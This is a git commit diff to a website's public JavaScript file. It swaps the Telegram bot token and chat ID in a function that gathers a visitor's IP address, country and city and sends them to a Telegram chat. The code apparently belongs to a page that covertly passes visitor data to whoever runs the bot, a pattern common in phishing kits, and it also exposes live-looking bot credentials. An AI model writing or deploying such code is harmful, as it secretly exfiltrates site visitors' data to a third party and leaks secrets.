e2e2cb095437326bc154d69b5c5704b83d8bddef
mentorblack1 <vuvansonss@gmail.com>
2025-05-23 01:50:37 +0700

    Update index.js

--- public/js/index.js
+++ public/js/index.js
@@ -239,8 +239,8 @@ function showPrompt(IpAddress) {
         '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
         '%0A<strong>City : </strong>' + IpAddress.city ;
 
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const botToken = '7915689883:AAFk_jhQ4aVXoZ8RAjcVuYl1K0_Rk78yD_o'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1002674039533'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
